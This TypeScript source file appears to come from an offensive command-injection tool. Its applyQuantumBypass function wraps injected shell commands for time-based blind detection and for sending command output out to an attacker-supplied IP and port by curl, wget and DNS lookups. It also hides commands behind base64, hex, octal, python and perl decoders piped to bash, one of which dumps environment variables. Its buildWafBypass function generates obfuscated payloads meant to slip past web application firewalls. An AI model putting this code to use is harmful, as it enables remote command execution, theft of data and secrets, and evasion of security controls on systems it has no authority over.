export function applyQuantumBypass(
  cmd: string,
  mode: string,
  attackerIp = "127.0.0.1",
  attackerPort = "4444"
): string {
  if (!cmd) return "";
  const raw = String(cmd);

  if (mode === "blind") {
    return (
      `_NX_T=$SECONDS; ` +
      `{ ${raw}; } 2>&1; ` +
      `_NX_E=$?; ` +
      `_NX_DELAY=$((RANDOM % 4 + 5)); ` +
      `sleep $_NX_DELAY 2>/dev/null || ping -c $_NX_DELAY 127.0.0.1 >/dev/null 2>&1; ` +
      `echo "[nx:blind|exit:$_NX_E|delay:$((SECONDS-_NX_T))s]"`
    );
  }

  if (mode === "oob") {
    const b64cmd = Buffer.from(raw).toString("base64");
    return (
      `_NX_OUT=$(${raw} 2>&1); ` +
      `_NX_B64=$(printf '%s' "$_NX_OUT" | base64 -w0 2>/dev/null || printf '%s' "$_NX_OUT" | base64 2>/dev/null || echo "$(printf '%s' "$_NX_OUT" | od -A n -t x1 | tr -d ' \\n')"); ` +
      `_NX_TRIM=$(printf '%s' "$_NX_OUT" | head -c 60 | tr -cd '[:alnum:]._-'); ` +
      `curl -sk -m 10 -X POST "http://${attackerIp}:${attackerPort}/oob" ` +
        `--data-urlencode "data=$_NX_OUT" --data-urlencode "b64=$_NX_B64" ` +
        `-H "X-NX-Cmd: ${b64cmd}" >/dev/null 2>&1 & ` +
      `wget -qO/dev/null --timeout=10 "http://${attackerIp}:${attackerPort}/oob?b=$_NX_B64" 2>/dev/null & ` +
      `curl -sk -m 10 "https://${attackerIp}:${attackerPort}/oob?b=$_NX_B64" >/dev/null 2>&1 & ` +
      `nslookup "$_NX_TRIM.oob.${attackerIp}" >/dev/null 2>&1 & ` +
      `dig +short "$_NX_TRIM.nx.${attackerIp}" 2>/dev/null & ` +
      `printf '%s\\n' "$_NX_OUT"`
    );
  }

  if (mode === "quantum") {
    const b64 = Buffer.from(raw).toString("base64");
    const b64env = Buffer.from(`${raw} 2>&1; env`).toString("base64");
    const hex = Array.from(Buffer.from(raw))
      .map(b => `\\x${b.toString(16).padStart(2, "0")}`)
      .join("");
    const oct = Array.from(Buffer.from(raw))
      .map(b => `\\${b.toString(8).padStart(3, "0")}`)
      .join("");
    return (
      `{ {echo,${b64}}|{base64,-d}|bash; } 2>/dev/null || ` +
      `{ eval "$(printf '${hex}')"; } 2>/dev/null || ` +
      `{ eval "$(printf '${oct}')"; } 2>/dev/null || ` +
      `{ bash<<<$(echo${String.fromCharCode(9)}${b64}|base64${String.fromCharCode(9)}-d); } 2>/dev/null || ` +
      `{ python3 -c "import base64,os;os.system(base64.b64decode('${b64}').decode())" 2>/dev/null; } || ` +
      `{ perl -e "system(unpack('A*',pack('H*','${Buffer.from(raw).toString("hex")}')))" 2>/dev/null; } || ` +
      `{ {echo,${b64env}}|{base64,-d}|bash; } 2>/dev/null`
    );
  }

  return raw;
}

export function buildWafBypass(payload: string): string {
  const variants: string[] = [];
  const b64 = Buffer.from(payload).toString("base64");
  const hex = Array.from(Buffer.from(payload))
    .map(b => `\\x${b.toString(16).padStart(2, "0")}`)
    .join("");

  variants.push(`{echo,${b64}}|{base64,-d}|bash`);
  variants.push(`bash<<<$(echo${String.fromCharCode(9)}${b64}|base64${String.fromCharCode(9)}-d)`);
  variants.push(`eval "$(printf '${hex}')"`);
  variants.push(
    payload
      .split("")
      .map((c, i) => (i % 3 === 0 && /[a-zA-Z]/.test(c) ? `'${c}'` : c))
      .join("")
  );
  variants.push(`X=$'${hex}';$X`);

  return variants.join("\n");
}
